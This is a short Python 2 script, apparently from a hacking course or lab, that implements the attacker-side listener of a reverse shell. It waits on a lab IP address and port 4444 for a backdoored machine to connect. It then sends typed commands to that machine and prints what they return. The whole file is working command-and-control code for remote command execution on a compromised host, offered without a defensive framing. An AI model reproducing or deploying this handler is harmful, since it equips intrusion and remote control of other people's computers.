#!/usr/bin/python

import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # enables option to reuse sockets, can use socket to reestablish
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        # number of connections that can be Q'd is arg
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, addr = listener.accept()
        print("[+] Got a connection from " + str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)

# probably needs to be part of another class but lazy
my_listener = Listener("10.0.2.16", 4444)
my_listener.run()
